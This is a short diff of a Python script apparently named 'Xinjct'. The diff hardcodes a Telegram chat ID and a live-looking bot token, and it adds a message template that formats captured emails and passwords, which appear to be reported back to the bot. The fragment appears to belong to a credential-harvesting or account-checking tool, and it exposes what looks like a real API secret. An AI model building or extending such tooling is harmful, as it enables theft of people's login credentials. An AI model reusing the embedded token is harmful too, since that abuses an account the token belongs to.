@@ -12,8 +12,8 @@ logo = pyfiglet.figlet_format('Xinjct',font='alligator')
 print("\n"+logo)
 print("\n"+logo2+"\n\n")
 
-idtele = ""
-botele = ""
+idtele = "1352346351"
+botele = "5362092593:AAHM7SqxzKpLxp_lsJnZm0Zt7wMBFTSdf90"
 msg_good = """
           ⌯ Email : {email}
           ⌯ Pass : {pasw}
